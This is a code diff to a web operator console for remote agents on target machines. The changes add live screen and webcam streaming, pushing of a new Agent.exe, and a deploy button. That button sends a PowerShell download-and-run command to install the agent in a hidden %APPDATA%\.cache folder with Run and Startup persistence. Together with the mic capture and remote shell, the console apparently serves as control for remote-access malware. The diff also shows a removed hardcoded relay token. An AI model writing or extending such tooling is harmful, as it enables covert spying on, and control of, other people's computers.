@@ -88,6 +88,25 @@
     background:#05070a;min-height:220px;overflow:hidden;
   }
   #shot{max-width:100%;max-height:100%;display:block;object-fit:contain}
+
+  /* viewport mode + quality bar */
+  .viewctl{
+    display:flex;align-items:center;gap:8px;flex-wrap:wrap;
+    padding:7px 12px;border-bottom:1px solid var(--line);background:#0f141a;
+  }
+  .viewctl select{min-width:0;padding:5px 8px;font-size:11.5px}
+  .viewctl label{color:var(--dim);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase}
+  .seg{display:flex;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+  .seg button{border:0;border-radius:0;padding:5px 10px;font-size:11px;background:#0f141a;color:var(--dim)}
+  .seg button:hover{background:#171e26}
+  .seg button.on{background:#141a21;color:var(--text);box-shadow:inset 0 -2px 0 var(--accent)}
+  .pill{
+    font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;
+    padding:3px 9px;border-radius:999px;border:1px solid var(--line);
+    color:var(--dim);background:#05070a;
+  }
+  .pill.on{color:#8ff0b7;border-color:rgba(57,212,125,.45);background:rgba(57,212,125,.1)}
+  .pill.busy{color:#ffd38a;border-color:rgba(240,169,59,.45);background:rgba(240,169,59,.1)}
   #log{
     flex:1;overflow:auto;background:#05070a;color:#b7c4d4;
     padding:10px 12px;font-size:12px;line-height:1.5;white-space:pre-wrap;
@@ -165,6 +184,9 @@
   <div class="sep"></div>
   <span style="color:var(--dim);font-size:11px" id="attach">detached</span>
   <div style="flex:1"></div>
+  <button id="deploy" title="install/repair the agent on the attached machine from the relay">deploy agent</button>
+  <button id="update" title="push a new Agent.exe to the attached agent">update agent</button>
+  <input id="updfile" type="file" accept=".exe" hidden>
   <button id="kill" class="danger">kill agent</button>
 </header>
 
@@ -173,10 +195,34 @@
     <div class="panel-h">
       <span>viewport</span>
       <div class="right">
-        <button id="shot1">single</button>
-        <button id="shot2" class="primary">stream</button>
-        <button id="shot3">stop</button>
+        <button id="shot1" title="take one screenshot (cancels any stream)">single</button>
+        <button id="shot2" class="primary" title="start streaming">stream</button>
+        <button id="shot3" disabled title="stop streaming">stop</button>
       </div>
+    </div>
+    <div class="viewctl">
+      <label>source</label>
+      <div class="seg" id="srcseg" title="what the viewport shows">
+        <button class="on" data-src="screen">screen</button>
+        <button data-src="camera">camera</button>
+      </div>
+      <label>mode</label>
+      <span id="streamstate" class="pill">idle</span>
+      <div style="flex:1"></div>
+      <label for="qpreset">quality</label>
+      <select id="qpreset" title="resolution and JPEG quality of single frames and the stream">
+        <option value="full">full · native · q80</option>
+        <option value="high">high · 1920px · q70</option>
+        <option value="medium">medium · 1280px · q60</option>
+        <option value="low">low · 854px · q45</option>
+      </select>
+      <label for="fps">rate</label>
+      <select id="fps" title="stream frame interval">
+        <option value="1000">1 fps</option>
+        <option value="500" selected>2 fps</option>
+        <option value="250">4 fps</option>
+        <option value="150">6 fps</option>
+      </select>
     </div>
     <div id="screen-wrap"><img id="shot" alt=""></div>
     <div class="panel-h"><span>shell</span><span class="num" id="outstat" style="color:#7b8696;font-size:11px">0 out</span></div>
@@ -246,8 +292,16 @@
 // =========================================================================
 // FILL
 // =========================================================================
-const RELAY = "wss://operator-nmth.onrender.com/ws";
-const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";
+// The console is served by the relay itself, so it must not carry a relay URL
+// or token of its own. The relay injects window.__RELAY_CFG__ into this page
+// when serving it; opening the file any other way falls back to the origin it
+// was loaded from (and a local relay on 10099 for file:// dev).
+const CFG = window.__RELAY_CFG__ || {};
+const RELAY = CFG.ws ||
+  (location.host
+    ? `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}/ws`
+    : 'ws://127.0.0.1:10099/ws');
+const TOKEN = CFG.token || '';
 
 const $ = id => document.getElementById(id);
 
@@ -286,7 +340,23 @@ const dRate = $('d-rate'), dCh = $('d-ch'), dBits = $('d-bits'),
 // =========================================================================
 let ws = null;
 let attachedId = null;
-let frames = 0, outs = 0;
+let outs = 0;
+
+// Viewport state, one record per source. The same single/stream/stop controls
+// drive whichever source is selected.
+const VIEW = {
+  screen: { streaming:false, pending:0, frames:0, lastAt:0,
+            op:'screenshot', once:'screenshotOnce' },
+  camera: { streaming:false, pending:0, frames:0, lastAt:0,
+            op:'camera', once:'cameraOnce' },
+};
+let source = 'screen';
+const QUALITY_PRESETS = {
+  full:   { quality: 80, maxW: 0    },   // native resolution
+  high:   { quality: 70, maxW: 1920 },
+  medium: { quality: 60, maxW: 1280 },
+  low:    { quality: 45, maxW: 854  },
+};
 
 let audioCtx = null;
 let nextTime = 0;
@@ -431,30 +501,60 @@ setInterval(() => {
 // =========================================================================
 $('connect').onclick = () => {
   connDot.classList.remove('ok');
+  if (!TOKEN) {
+    log('[err] no relay token in this page — open the console from the relay URL', 'm-err');
+    return;
+  }
   log('[sys] connecting ' + RELAY, 'm-sys');
   ws = new WebSocket(`${RELAY}?role=operator&token=${encodeURIComponent(TOKEN)}`);
   ws.onopen = () => { connDot.classList.add('ok'); log('[sys] connected', 'm-sys'); ws.send(JSON.stringify({op:'list'})); };
-  ws.onclose = (e) => { connDot.classList.remove('ok'); log('[sys] closed ' + (e.code||''), 'm-err'); };
+  ws.onclose = (e) => {
+    connDot.classList.remove('ok');
+    log('[sys] closed ' + (e.code||''), 'm-err');
+    resetViews();
+  };
   ws.onerror = () => log('[sys] socket error', 'm-err');
   ws.onmessage = (ev) => {
     let m; try { m = JSON.parse(ev.data); } catch { return; }
+
+    // Ignore traffic that belongs to an agent we are no longer attached to.
+    if (m.id && attachedId && m.id !== attachedId &&
+        (m.op === 'frame' || m.op === 'camframe' || m.op === 'out' ||
+         m.op === 'log' || m.op === 'pcm' || m.op === 'shot' ||
+         m.op === 'cam' || m.op === 'updstate' ||
+         m.op === 'micPeak' || m.op === 'micDiag')) return;
+
     if (m.op === 'agents') {
       const cur = agentsEl.value;
       agentsEl.innerHTML = '<option value="">-- pick target --</option>';
       for (const a of (m.list || [])) {
         const o = document.createElement('option');
         o.value = a.id;
-        o.textContent = `${a.id}  (${a.info?.user || '?'}@${a.info?.hostname || '?'})`;
+        o.textContent = `${a.name || a.id}  (${a.info?.user || '?'}@${a.info?.hostname || '?'})`;
         agentsEl.appendChild(o);
       }
-      if (cur) agentsEl.value = cur;
+      if (cur && [...agentsEl.options].some(o => o.value === cur)) agentsEl.value = cur;
+      else if (attachedId && [...agentsEl.options].some(o => o.value === attachedId)) agentsEl.value = attachedId;
       if (!cur && (m.list||[]).length === 1) {
         agentsEl.value = m.list[0].id;
         agentsEl.dispatchEvent(new Event('change'));
       }
     } else if (m.op === 'attached') {
-      attachedId = m.id;
-      attachEl.textContent = 'attached ' + m.id;
+      attachedId = m.id || null;
+      attachEl.textContent = attachedId ? 'attached ' + attachedId.slice(0, 8) : 'detached';
+      // An updated agent comes back with a new sid: keep the picker in sync.
+      if (attachedId && [...agentsEl.options].some(o => o.value === attachedId))
+        agentsEl.value = attachedId;
+      // Stream state for the new target arrives as {op:'shot'} / {op:'cam'} echoes.
+      resetViews();
+    } else if (m.op === 'agentGone') {
+      if (m.id === attachedId) {
+        attachedId = null;
+        agentsEl.value = '';
+        attachEl.textContent = 'detached';
+        resetViews();
+      }
+      log('[sys] agent gone ' + String(m.id).slice(0, 8), 'm-err');
     } else if (m.op === 'err') {
       log('[err] ' + m.reason, 'm-err');
     } else if (m.op === 'out') {
@@ -462,9 +562,38 @@ $('connect').onclick = () => {
       try { log(new TextDecoder().decode(b64ToU8(m.data)), 'm-out'); } catch {}
     } else if (m.op === 'log') {
       log('[agent] ' + m.msg, 'm-sys');
-    } else if (m.op === 'frame') {
-      frames++;
+    } else if (m.op === 'frame' || m.op === 'camframe') {
+      const key = m.op === 'frame' ? 'screen' : 'camera';
+      const v = VIEW[key];
+      v.frames++;
+      if (key !== source) return;              // hidden source: count only
+      // Drop stale frames: a stopped stream must not keep painting the viewport.
+      if (!v.streaming && v.pending <= 0) return;
+      if (v.pending > 0) { v.pending--; renderStream(); }
+      v.lastAt = Date.now();
       shotEl.src = 'data:image/jpeg;base64,' + m.data;
+    } else if (m.op === 'shot' || m.op === 'cam') {
+      const key = m.op === 'shot' ? 'screen' : 'camera';
+      const v = VIEW[key];
+      v.streaming = m.on === true;
+      if (v.streaming) v.pending = 0;
+      if (key === source) renderStream();
+      log(`[${key}] ` + (m.on
+        ? `streaming q${m.quality} ${m.maxW ? m.maxW + 'px' : 'native'} @ ${m.intervalMs}ms`
+        : 'stopped'), 'm-shot');
+    } else if (m.op === 'updstate') {
+      if (m.phase === 'chunk') {
+        const pct = m.size ? Math.round(100 * m.got / m.size) : 0;
+        $('update').textContent = `updating ${pct}%`;
+      } else {
+        log(`[upd] ${m.phase}${m.msg ? ' — ' + m.msg : ''}`,
+            m.phase === 'error' ? 'm-err' : 'm-sys');
+        if (m.phase === 'error' || m.phase === 'applying') {
+          updating = false;
+          $('update').classList.remove('busy');
+          $('update').textContent = 'update agent';
+        }
+      }
     } else if (m.op === 'pcm') {
       audIn++; audin.textContent = audIn;
       if (recording) appendRecording(m.data);
@@ -487,6 +616,7 @@ $('connect').onclick = () => {
 
 agentsEl.onchange = () => {
   attachedId = agentsEl.value || null;
+  resetViews();
   if (attachedId && ws && ws.readyState === 1) ws.send(JSON.stringify({op:'attach', id: attachedId}));
   else attachEl.textContent = 'detached';
 };
@@ -505,11 +635,119 @@ cmdEl.addEventListener('keydown', e => {
 });
 
 // =========================================================================
-// Screenshot
+// Viewport — screen / camera, single / stream / stop (+ quality + rate)
 // =========================================================================
-$('shot1').onclick = () => attachedId && ws && ws.send(JSON.stringify({op:'screenshotOnce'}));
-$('shot2').onclick = () => attachedId && ws && ws.send(JSON.stringify({op:'screenshot', on:true}));
-$('shot3').onclick = () => attachedId && ws && ws.send(JSON.stringify({op:'screenshot', on:false}));
+const qpresetEl     = $('qpreset');
+const fpsEl         = $('fps');
+const streamStateEl = $('streamstate');
+const srcSegEl      = $('srcseg');
+
+function V(){ return VIEW[source]; }
+function resetViews(){
+  for (const k of Object.keys(VIEW)) { VIEW[k].streaming = false; VIEW[k].pending = 0; }
+  renderStream();
+}
+
+function shotParams(){
+  const p = QUALITY_PRESETS[qpresetEl.value] || QUALITY_PRESETS.full;
+  return { quality: p.quality, maxW: p.maxW };
+}
+function canSend(){
+  if (!attachedId) return (log('[err] no target', 'm-err'), false);
+  if (!ws || ws.readyState !== 1) return (log('[err] ws down', 'm-err'), false);
+  return true;
+}
+function sendOp(obj){
+  if (!canSend()) return false;
+  try { ws.send(JSON.stringify(obj)); return true; }
+  catch (e) { log('[err] send failed: ' + e.message, 'm-err'); return false; }
+}
+function renderStream(){
+  const v = V();
+  const label = v.streaming ? 'streaming' : (v.pending > 0 ? 'single' : 'idle');
+  $('shot2').classList.toggle('primary', !v.streaming);
+  $('shot2').textContent = v.streaming ? 'streaming' : 'stream';
+  $('shot3').classList.toggle('danger', v.streaming);
+  $('shot3').disabled = !v.streaming;
+  streamStateEl.textContent = label;
+  streamStateEl.classList.toggle('on', v.streaming);
+  streamStateEl.classList.toggle('busy', !v.streaming && v.pending > 0);
+}
+function startStream(){
+  const v = V();
+  const p = shotParams();
+  const iv = Number(fpsEl.value) || 500;
+  if (!sendOp({ op:v.op, on:true, quality:p.quality, maxW:p.maxW, intervalMs:iv })) return;
+  v.streaming = true;
+  v.pending = 0;
+  renderStream();
+  log(`[${source}] stream ON  q${p.quality} · ${p.maxW ? p.maxW + 'px' : 'native'} · ${iv}ms`, 'm-shot');
+}
+function stopStream(silent){
+  const v = V();
+  v.streaming = false;
+  v.pending = 0;
+  sendOp({ op:v.op, on:false });
+  renderStream();
+  if (!silent) log(`[${source}] stream OFF`, 'm-shot');
+}
+function singleShot(){
+  if (!canSend()) return;
+  // Single is a mode: it always cancels a running stream first.
+  const v = V();
+  v.streaming = false;
+  v.pending++;
+  const p = shotParams();
+  sendOp({ op:v.op, on:false });
+  if (!sendOp({ op:v.once, quality:p.quality, maxW:p.maxW })) {
+    v.pending = 0;
+    renderStream();
+    return;
+  }
+  renderStream();
+  log(`[${source}] single`, 'm-shot');
+  // Safety: never leave a phantom "single" state if no frame comes back.
+  const token = v.pending;
+  setTimeout(() => {
+    if (v.pending === token) { v.pending = 0; renderStream(); }
+  }, 8000);
+}
+
+function setSource(next){
+  if (next === source || !VIEW[next]) return;
+  const wasStreaming = V().streaming;
+  if (wasStreaming) stopStream(true);   // stop the old source before switching
+  source = next;
+  for (const b of srcSegEl.querySelectorAll('button'))
+    b.classList.toggle('on', b.dataset.src === source);
+  shotEl.removeAttribute('src');        // never show the other source's last frame
+  shotEl.alt = source;
+  renderStream();
+  log('[view] source → ' + source, 'm-sys');
+  if (wasStreaming) startStream();      // carry a live stream over to the new source
+}
+
+$('shot1').onclick = singleShot;
+$('shot2').onclick = startStream;
+$('shot3').onclick = () => stopStream(false);
+srcSegEl.onclick = (e) => {
+  const b = e.target.closest('button[data-src]');
+  if (b) setSource(b.dataset.src);
+};
+
+// Changing quality/rate while streaming restarts the stream with new params.
+qpresetEl.onchange = () => {
+  log('[shot] quality → ' + qpresetEl.value, 'm-sys');
+  if (V().streaming) startStream();
+};
+fpsEl.onchange = () => {
+  if (V().streaming) startStream();
+};
+window.addEventListener('keydown', e => {
+  if (e.key === 'Escape' && V().streaming) stopStream(false);
+});
+
+renderStream();
 
 // =========================================================================
 // Mic — ONE toggle
@@ -623,6 +861,66 @@ recStop.onclick = () => {
 };
 
 // =========================================================================
+// Agent update — push a locally built Agent.exe through the relay
+// =========================================================================
+const UPD_CHUNK = 16 * 1024;
+let updating = false;
+
+async function sha256Hex(u8){
+  const d = await crypto.subtle.digest('SHA-256', u8);
+  return [...new Uint8Array(d)].map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+$('update').onclick = () => {
+  if (!attachedId) return log('[err] no target', 'm-err');
+  if (!ws || ws.readyState !== 1) return log('[err] ws down', 'm-err');
+  if (updating) return log('[upd] already in progress', 'm-err');
+  $('updfile').click();
+};
+
+$('updfile').onchange = async () => {
+  const f = $('updfile').files[0];
+  $('updfile').value = '';
+  if (!f) return;
+  if (updating) return log('[upd] already in progress', 'm-err');
+  if (!attachedId) return log('[err] no target', 'm-err');
+
+  const buf = new Uint8Array(await f.arrayBuffer());
+  if (buf.length < 4096) return log('[upd] that does not look like an agent binary', 'm-err');
+
+  updating = true;
+  $('update').classList.add('busy');
+  const sha = await sha256Hex(buf);
+  log(`[upd] ${f.name} · ${(buf.length/1024).toFixed(0)} KB · sha256 ${sha.slice(0,16)}…`, 'm-sys');
+  sendOp({ op:'upd', phase:'begin', size: buf.length, sha256: sha, name: f.name });
+  for (let off = 0; off < buf.length; off += UPD_CHUNK) {
+    const part = buf.subarray(off, Math.min(off + UPD_CHUNK, buf.length));
+    sendOp({ op:'upd', phase:'chunk', seq: off / UPD_CHUNK, data: u8ToB64(part) });
+  }
+  sendOp({ op:'upd', phase:'end' });
+};
+
+// =========================================================================
+// Agent deploy — install/repair on a machine that cannot self-update yet
+//
+// Runs the relay-hosted installer through the agent's PowerShell channel. The
+// installer verifies the SHA-256, stops the running copy, installs to
+// %APPDATA%\.cache, arms Run + Startup and starts it. The old agent dies
+// mid-command, so the console goes quiet for a moment and then re-attaches.
+// =========================================================================
+$('deploy').onclick = () => {
+  if (!canSend()) return;
+  const base = location.origin;
+  const cmd =
+    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; " +
+    "$p=Join-Path $env:TEMP 'install-agent.ps1'; " +
+    `iwr '${base}/install-agent.ps1' -Headers @{'X-Relay-Token'='${TOKEN}'} -OutFile $p -UseBasicParsing; ` +
+    `& $p -Base '${base}' -Token '${TOKEN}'`;
+  ws.send(JSON.stringify({ op:'in', data: u8ToB64(new TextEncoder().encode(cmd)) }));
+  log('[deploy] install command sent — the agent restarts, expect a brief drop', 'm-sys');
+};
+
+// =========================================================================
 // Kill
 // =========================================================================
 $('kill').onclick = () => {
@@ -636,7 +934,12 @@ $('kill').onclick = () => {
 // =========================================================================
 window.__dbg = () => ({
   wsState: ws ? ws.readyState : -1,
-  attachedId, micOn,
+  attachedId, micOn, source,
+  streaming: V().streaming, pendingSingles: V().pending,
+  frames: V().frames, lastFrameAt: V().lastAt,
+  screen: { streaming: VIEW.screen.streaming, frames: VIEW.screen.frames },
+  camera: { streaming: VIEW.camera.streaming, frames: VIEW.camera.frames },
+  quality: qpresetEl.value, rate: fpsEl.value,
   ctxState: audioCtx ? audioCtx.state : 'none',
   audIn, audOut,
   lastPeak: lastPeak.toFixed(3),
